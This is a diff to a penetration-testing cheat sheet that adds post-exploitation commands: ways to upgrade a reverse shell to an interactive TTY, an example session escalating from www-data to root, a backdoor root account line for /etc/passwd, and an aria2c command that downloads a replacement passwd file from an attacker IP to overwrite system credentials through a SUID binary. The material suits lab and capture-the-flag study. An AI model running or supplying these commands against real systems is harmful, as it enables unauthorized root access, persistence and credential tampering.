@@ -2903,6 +2903,37 @@ Folder Is not writable
  "Connection closed by 192.168.200.107 port 22"
  	If you receive this with a known id_rsa or password, then most likely the user you are connecting to does not actually exist
 
+ # Spawning Terminal (TTY) Shell From Reverse Shell
+
+ /bin/sh -i
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c "__import__('pty').spawn('/bin/bash')"
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+perl -e 'print `/bin/bash`'
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+
+    vi: :!bash
+    vi: :set shell=/bin/bash:shell
+    nmap: !sh
+    mysql: ! bash
+
+ 
+ /usr/bin/script -qc /bin/bash /dev/null
+
+Example: 
+/bin/sh: 0: can't access tty; job control turned off
+$ su root  
+su: must be run from a terminal
+$ /usr/bin/script -qc /bin/bash /dev/null
+www-data@assertion:/$ su root
+su root
+Password: password
+root@assertion:/#     
+
+ 
  # Breaking Out Of Restricted Shells
 
  	1) Copy /bin/bash to current directory, run bash again, you should have escaped
@@ -2924,4 +2955,11 @@ Folder Is not writable
 	1) Always check history files. .sql_history files can contain passwords, although they are formatted kind of like this:
  		insert\040into\040support\040(tom,\040xx11yy22!);
 	
- 
+	2) Adding new root account to /etc/passwd (root:password)
+ 	root2:2Te6hv5GiOmMc:0:0:root:/root:/bin/bash
+
+  # Aria2c
+
+  Summary: Network Downloader tools with the SUID root bit set can be used to overwrite files, such as /etc/passwd or /root/.ssh/id_rsa
+
+  /usr/bin/aria2c -d /etc -o passwd "http://192.168.45.182:80/etc_passwd.txt" --allow-overwrite=true
